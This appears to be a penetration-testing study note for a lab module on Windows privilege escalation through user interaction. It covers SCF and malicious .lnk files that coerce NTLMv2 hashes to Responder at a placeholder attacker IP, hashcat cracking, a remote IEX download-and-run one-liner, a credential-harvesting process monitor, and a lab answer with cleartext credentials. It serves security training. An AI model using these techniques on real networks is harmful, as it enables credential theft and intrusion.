# NOTE — Interacting with Users

## ID
2500

## Module
Windows Privilege Escalation

## Kind
notes

## Title
Section 25 — Interacting with Users

## Description
Covers privilege escalation techniques that rely on user interaction or observation — traffic capture with Wireshark, process command-line monitoring for leaked credentials, SCF/LNK file attacks on file shares to capture NTLMv2 hashes via Responder, and exploiting vulnerable services like Docker Desktop.

## Tags
scf, responder, ntlmv2, hashcat, wireshark, credential-theft

## Commands
- `sudo responder -wrf -v -I tun0`
- `hashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt`
- `IEX (iwr 'http://<ATTACKER_IP>/procmon.ps1')`
- `Get-WmiObject Win32_Process | Select-Object CommandLine`

## What This Section Covers
When standard local privesc vectors are exhausted, attackers can pivot to techniques that exploit user behavior — capturing credentials from network traffic, monitoring process command lines for scheduled tasks that pass passwords as arguments, and planting malicious files on shared directories to coerce SMB authentication and capture NTLMv2 hashes. This section walks through traffic capture, process monitoring, SCF file attacks, and malicious `.lnk` file generation.

## Methodology
1. **Traffic capture**: If Wireshark is installed and the Npcap driver isn't restricted to Administrators (the default), an unprivileged user can capture network traffic and look for cleartext protocols (FTP, HTTP, SMTP). Alternatively run `tcpdump` or `net-creds` from an attack box on a live interface or pcap.
2. **Process command-line monitoring**: Run a PowerShell loop that polls `Get-WmiObject Win32_Process` every 1–2 seconds and diffs the output. Scheduled tasks or services may pass credentials on the command line (e.g., `net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd`). Host the script on your attack machine and pull it with `IEX (iwr 'http://<IP>/procmon.ps1')`.
3. **SCF file on a file share**: Create an SCF file with `IconFile` pointing to your SMB server. Name it with `@` prefix (e.g., `@Inventory.scf`) so it sorts to the top of the directory. Drop it in a heavily-used share. When any user browses that folder, Windows Explorer automatically attempts to resolve the icon via SMB, sending their NTLMv2 hash to your Responder listener.
4. **Start Responder**: `sudo responder -wrf -v -I tun0` — wait for the user to browse the share (2–5 minutes in the lab).
5. **Crack the hash**: Save the captured NTLMv2 hash and crack with `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`.
6. **Malicious `.lnk` file (Server 2019+)**: SCF files no longer trigger SMB auth on Server 2019. Use PowerShell to create a malicious shortcut where `TargetPath` points to `\\<attackerIP>\@pwn.png`. Tools like Lnkbomb can also automate this.

## Multi-step Workflow (optional)
```
# --- SCF file content (save as @Inventory.scf) ---
[Shell]
Command=2
IconFile=\\<ATTACKER_IP>\share\legit.ico
[Taskbar]
Command=ToggleDesktop

# --- Malicious .lnk via PowerShell ---
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<ATTACKER_IP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()

# --- Process monitoring script (procmon.ps1) ---
while($true) {
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Lab — Questions & Answers (optional)
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Obtain cleartext credentials for SCCM_SVC user | sccm_svc:Password1 | Created `@Inventory.scf` with `IconFile=\\<PWNBOX_IP>\share\legit.ico`, saved to `C:\Department Shares\Public\IT`. Ran `sudo responder -wrf -v -I tun0`, waited for user to browse share, captured NTLMv2 hash, cracked with `hashcat -m 5600` |

## Key Takeaways
- SCF files are powerful because Windows Explorer resolves the `IconFile` UNC path **automatically** when the folder is browsed — no user click required. The user just has to open the directory.
- Prefix the SCF filename with `@` so it appears at the top of directory listings and gets processed first.
- SCF attacks **do not work on Server 2019+** — use malicious `.lnk` files instead, which achieve the same SMB auth coercion.
- NTLMv2 hashes (hashcat mode `5600`) are **not** directly usable for Pass-the-Hash — they must be cracked to cleartext. Only NTLM (NT) hashes support PtH.
- The process monitoring technique is underrated — scheduled tasks, backup scripts, and service startups frequently pass credentials on the command line. Let the monitoring script run for a while.
- The Npcap "restrict to Administrators" checkbox is **not enabled by default** during Wireshark installation — always check if Wireshark is installed and try to capture.
- `net-creds` is a useful passive tool for sniffing passwords and hashes from a live interface or pcap file — good to leave running in the background during assessments.

## Gotchas
- In the lab, wait 2–5 minutes after placing the SCF file for the simulated "user" to browse the share — don't assume it failed if Responder doesn't immediately capture a hash.
- Responder flags: `-w` enables WPAD rogue proxy, `-r` enables responses for netbios wredir suffix queries, `-f` enables fingerprinting, `-v` enables verbose mode. Use all four for maximum capture capability.
- Make sure the SCF file's `IconFile` path uses your **tun0 IP**, not your local IP. Double-check with `ip a show tun0`.
- The `.lnk` PowerShell method requires WScript.Shell COM object access — if PowerShell is constrained, you may need to transfer a pre-built `.lnk` file.
